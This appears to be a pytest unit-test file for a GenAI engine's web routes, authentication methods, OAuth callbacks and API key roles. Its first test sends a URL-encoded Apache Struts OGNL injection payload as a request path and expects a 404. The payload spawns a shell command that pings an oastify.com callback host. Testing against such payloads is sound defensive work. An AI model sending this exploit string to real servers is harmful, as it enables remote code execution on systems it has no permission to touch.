import json
from base64 import b64decode, b64encode

import itsdangerous
import pytest
from auth.auth_constants import (
    ACCESS_TOKEN_COOKIE_NAME,
    ID_TOKEN_COOKIE_NAME,
    OAUTH_CLIENT_NAME,
    USER_INFO_COOKIE_NAME,
)
from httpx import Response
from tests.clients.base_test_client import (
    MASTER_KEY_AUTHORIZED_HEADERS,
    GenaiEngineTestClientBase,
)
from tests.unit.utils.test_utils import UserType
from utils import constants
from utils.utils import get_env_var, is_api_only_mode_enabled


@pytest.mark.unit_tests
def test_file_path_too_long(client: GenaiEngineTestClientBase):
    path = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27ping%20ar5i7w09vwgei12n49gwe13k2b81wq.oastify.com%20-c1%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D"
    assert (
        client.base_client.get(
            path,
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 404
    )


@pytest.mark.unit_tests
@pytest.mark.skipif(
    is_api_only_mode_enabled(),
    reason="Skipping test because GENAI_ENGINE_API_ONLY_MODE_ENABLED is set to enabled",
)
def test_spa_static_file_path_respond(client: GenaiEngineTestClientBase):
    assert (
        client.base_client.get(
            "chat",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "login",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "logout",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "inferences",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "admin/inference-deep-dive",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "admin/tasks",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )
    assert (
        client.base_client.get(
            "admin/index.tsx",
            headers=client.authorized_user_api_key_headers,
        ).status_code
        == 200
    )


@pytest.mark.unit_tests
def test_muti_auth_methods_unit_test(client: GenaiEngineTestClientBase):
    path = "api/v2/tasks"
    for expected_status_code, kwargs in [
        (200, {"headers": client.authorized_user_api_key_headers}),
        (200, {"headers": MASTER_KEY_AUTHORIZED_HEADERS}),
        (200, {"headers": client.authorized_chat_headers}),
        (
            200,
            {
                "cookies": {
                    "ACCESS_TOKEN": client.authorized_chat_headers["Authorization"],
                },
            },
        ),
        (
            401,
            {
                "headers": {
                    "Authorization": "Bearer this_doesnt_match_api_key_nor_oauth",
                },
            },
        ),
    ]:
        response = client.base_client.get(path, **kwargs)
        assert response.status_code == expected_status_code


@pytest.mark.unit_tests
def test_unathenticated_options_request_allowed(client: GenaiEngineTestClientBase):
    headers = {}
    headers["Origin"] = "http://localhost"
    headers["Access-Control-Request-Method"] = "GET"
    response = client.base_client.options("/inferences/query", headers=headers)
    assert response.status_code == 200


@pytest.mark.unit_tests
def test_unathenticated_health_request_allowed(client: GenaiEngineTestClientBase):
    response = client.base_client.get("/health")
    assert response.status_code == 200


@pytest.mark.parametrize(
    ("user_type"),
    [UserType.ADMIN.value, UserType.NON_ADMIN.value, UserType.NO_NAME.value],
)
@pytest.mark.unit_tests
@pytest.mark.skipif(
    is_api_only_mode_enabled(),
    reason="Skipping test because GENAI_ENGINE_API_ONLY_MODE_ENABLED is set to enabled",
)
def test_auth_login_callback(user_type: UserType, client: GenaiEngineTestClientBase):
    data = {"redirect_uri": "http://testserver/auth/callback"}
    auth_session_data = {"data": data}
    key_string = f"_state_{OAUTH_CLIENT_NAME}_12345"
    key_string_1 = f"_state_{OAUTH_CLIENT_NAME}_56789"
    auth_session = {key_string: auth_session_data, key_string_1: auth_session_data}
    signer = itsdangerous.TimestampSigner(
        str(get_env_var(constants.GENAI_ENGINE_APP_SECRET_KEY_ENV_VAR)),
    )
    encoded_auth_session = b64encode(json.dumps(auth_session).encode("utf-8"))
    signed_auth_session = signer.sign(encoded_auth_session)
    response = client.base_client.get(
        "/auth/callback",
        cookies={
            "session": signed_auth_session.decode("utf-8"),
            "user_type": user_type,
        },
    )

    _assert_response_and_cookies(response, False, user_type)
    client.base_client.cookies.clear()


@pytest.mark.unit_tests
@pytest.mark.skipif(
    is_api_only_mode_enabled(),
    reason="Skipping test because GENAI_ENGINE_API_ONLY_MODE_ENABLED is set to enabled",
)
def test_auth_login_callback_random_auth_session_data(
    client: GenaiEngineTestClientBase,
):
    data = {"redirect_uri": "http://testserver/auth/callback"}
    auth_session_data = {"data": data}
    key_string = f"_state_whatever_12345"
    key_string_1 = f"_state_whatever_56789"
    auth_session = {key_string: auth_session_data, key_string_1: auth_session_data}
    signer = itsdangerous.TimestampSigner(
        str(get_env_var(constants.GENAI_ENGINE_APP_SECRET_KEY_ENV_VAR)),
    )
    encoded_auth_session = b64encode(json.dumps(auth_session).encode("utf-8"))
    signed_auth_session = signer.sign(encoded_auth_session)
    response = client.base_client.get(
        "/auth/callback",
        cookies={
            "session": signed_auth_session.decode("utf-8"),
            "user_type": UserType.NON_ADMIN.value,
        },
    )

    _assert_response_and_cookies(response, True, UserType.NON_ADMIN.value)
    client.base_client.cookies.clear()


@pytest.mark.unit_tests
@pytest.mark.skipif(
    is_api_only_mode_enabled(),
    reason="Skipping test because GENAI_ENGINE_API_ONLY_MODE_ENABLED is set to enabled",
)
def test_auth_login_callback_different_redirect_uri(client: GenaiEngineTestClientBase):
    data = {"redirect_uri": "http://whatever-url/auth/callback"}
    auth_session_data = {"data": data}
    key_string = f"_state_{OAUTH_CLIENT_NAME}_12345"
    key_string_1 = f"_state_{OAUTH_CLIENT_NAME}_56789"
    auth_session = {key_string: auth_session_data, key_string_1: auth_session_data}
    signer = itsdangerous.TimestampSigner(
        str(get_env_var(constants.GENAI_ENGINE_APP_SECRET_KEY_ENV_VAR)),
    )
    encoded_auth_session = b64encode(json.dumps(auth_session).encode("utf-8"))
    signed_auth_session = signer.sign(encoded_auth_session)
    response = client.base_client.get(
        "/auth/callback",
        cookies={
            "session": signed_auth_session.decode("utf-8"),
            "user_type": UserType.NON_ADMIN.value,
        },
    )
    _assert_response_and_cookies(response, True, UserType.NON_ADMIN.value)
    client.base_client.cookies.clear()


@pytest.mark.unit_tests
@pytest.mark.parametrize(
    "given_description, given_role",
    [
        ("Some random description", [constants.TASK_ADMIN]),
        ("Some random description", [constants.VALIDATION_USER]),
    ],
)
def test_create_api_key_with_role(
    given_description: str,
    given_role: str,
    client: GenaiEngineTestClientBase,
):
    status_code, response = client.create_api_key(
        description=given_description,
        roles=given_role,
    )
    assert status_code == 200
    assert response.description == given_description

    client.deactivate_api_key(response)


@pytest.mark.unit_tests
def test_create_api_key_with_invalid_role(client: GenaiEngineTestClientBase):
    status_code, _ = client.create_api_key(
        description="Not valid role",
        roles=["invalid_role"],
    )
    assert status_code == 400


def _assert_response_and_cookies(
    response: Response,
    session_expected: bool,
    user_type: str,
):
    assert response.status_code == 200
    response_history = response.history[0]
    assert response_history.status_code == 302
    cookies_list = response_history.cookies
    cookies_keys = cookies_list.keys()
    assert ACCESS_TOKEN_COOKIE_NAME in cookies_keys
    assert ID_TOKEN_COOKIE_NAME in cookies_keys
    assert USER_INFO_COOKIE_NAME in cookies_keys
    if session_expected:
        assert "session" in cookies_keys
    else:
        assert "session" not in cookies_keys
    assert cookies_list.get(ACCESS_TOKEN_COOKIE_NAME) == '"Bearer accessToken"'
    assert cookies_list.get(ID_TOKEN_COOKIE_NAME) == '"Bearer id_token"'
    decoded_user = json.loads(b64decode(cookies_list.get(USER_INFO_COOKIE_NAME)))
    assert "email" in decoded_user
    assert "first_name" in decoded_user
    assert "last_name" in decoded_user
    assert decoded_user["email"] == "test@arthur.ai"
    if user_type == UserType.ADMIN:
        assert decoded_user["first_name"] == "test"
        assert decoded_user["last_name"] == "test"
    if user_type == UserType.NON_ADMIN:
        assert decoded_user["first_name"] == "test"
        assert decoded_user["last_name"] == "test"
    if user_type == UserType.NO_NAME:
        assert decoded_user["first_name"] == None
        assert decoded_user["last_name"] == None
